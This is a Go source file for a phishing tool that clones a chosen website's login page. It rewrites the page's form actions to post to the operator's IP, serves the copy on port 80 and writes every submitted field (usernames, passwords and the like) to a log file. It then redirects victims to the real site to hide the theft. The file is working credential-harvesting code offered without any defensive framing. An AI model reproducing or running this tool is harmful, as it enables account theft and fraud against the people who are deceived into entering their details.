package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"text/template"
)

var (
	hooktemplate, thehooktmpl, abouttmpl *template.Template
	logf                                 *os.File
	cloneurl, port, ipforhook            string
)

func init() {
	thehooktmpl = template.Must(template.ParseFiles("templates/thehook.html"))
	abouttmpl = template.Must(template.ParseFiles("templates/about.html"))
	port = "80"
}

func checkerr(err error) {
	fmt.Println(err)
}

func clonehook(urltoclone string) {
	req, err := http.NewRequest("GET", urltoclone, nil)
	checkerr(err)
	client := &http.Client{}
	resp, err := client.Do(req)
	checkerr(err)
	body, err := ioutil.ReadAll(resp.Body)
	checkerr(err)
	fi, err := os.Create("templates/fish.html")
	defer fi.Close()
	checkerr(err)
	fi.Write(body)
}

func updatehook() {
	replaceregex := `action="([^\\"]|\\")*"`
	replaceregex2 := `onsubmit="([^\\"]|\\")*"`
	re := regexp.MustCompile(replaceregex)
	re2 := regexp.MustCompile(replaceregex2)

	fi, err := os.Create("templates/hook.html")
	checkerr(err)
	defer fi.Close()

	fo, err := os.Open("templates/fish.html")
	checkerr(err)
	defer fo.Close()

	output, err := ioutil.ReadAll(fo)
	checkerr(err)
	hookurl := "action=" + `"http://` + ipforhook + `:80"`
	newstring := re.ReplaceAllString(string(output), hookurl)
	newstring = re2.ReplaceAllString(newstring, "")

	//fmt.Println(newstring)
	fi.WriteString(newstring)
	hooktemplate = template.Must(template.ParseFiles("templates/hook.html"))

}

/*func status(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := statustemplate.Execute(httpw, nil)
		checkerr(err)
	} else {
		err := req.ParseForm()
		checkerr(err)
		cloneurl = req.Form.Get("target")
		port = req.Form.Get("port")

		err = statustemplate.Execute(httpw, nil)
		checkerr(err)

		fmt.Println("URL " + cloneurl + " Port " + port)

	}
}*/

func thehook(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := thehooktmpl.Execute(httpw, nil)
		checkerr(err)
	} else {
		err := req.ParseForm()
		checkerr(err)
		ipforhook = req.Form.Get("ip")
		cloneurl = req.Form.Get("clone")
		cloneurl = strings.TrimSpace(cloneurl)

		clonehook(cloneurl)
		updatehook()
		//hooktemplate = template.Must(template.ParseFiles("templates/hook.html"))
		//startcloneserver()
		err = thehooktmpl.Execute(httpw, nil)
		checkerr(err)

	}
}
func index(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := hooktemplate.Execute(httpw, nil)
		checkerr(err)
	} else {
		err := req.ParseForm()
		checkerr(err)

		if _, err := os.Stat("logs/alllogs.txt"); !os.IsNotExist(err) {
			fmt.Println("File exists")
			logf, err := os.OpenFile("logs/alllogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			checkerr(err)
			defer logf.Close()
			for key, values := range req.Form { // range over map
				for _, value := range values { // range over []string
					logf.WriteString(key + " " + value + "\n")
					fmt.Println("Hooked key " + key + " Value " + value)
				}
			}

		} else {
			logf, err := os.Create("logs/alllogs.txt")
			checkerr(err)
			defer logf.Close()

			for key, values := range req.Form { // range over map
				for _, value := range values { // range over []string
					logf.WriteString(key + " " + value + "\n")
					fmt.Println("Hooked key " + key + " Value " + value)
				}
			}
		}
		fmt.Println("cloned url is " + cloneurl)
		http.Redirect(httpw, req, cloneurl, http.StatusSeeOther)
	}

}

func about(httpwr http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := abouttmpl.Execute(httpwr, nil)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func startcloneserver() {
	http.HandleFunc("/thehook", thehook)
	http.HandleFunc("/about", about)

	http.Handle("/static/css/", http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css"))))
	http.ListenAndServe(":"+"8085", nil)

}
func main() {
	fmt.Println("Hook Started...")
	/*reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter URL to clone : ")
	cloneurl, _ = reader.ReadString('\n')
	fmt.Print("Enter IP you want to listen for : ")
	ipforhook, _ = reader.ReadString('\n')
	cloneurl = strings.TrimSpace(cloneurl)
	ipforhook = strings.TrimSpace(ipforhook)
	//fmt.Println("URL : ", cloneurl)

	clonehook(cloneurl)
	updatehook()*/
	go startcloneserver()
	http.HandleFunc("/", index)
	http.ListenAndServe(":"+port, nil)

}
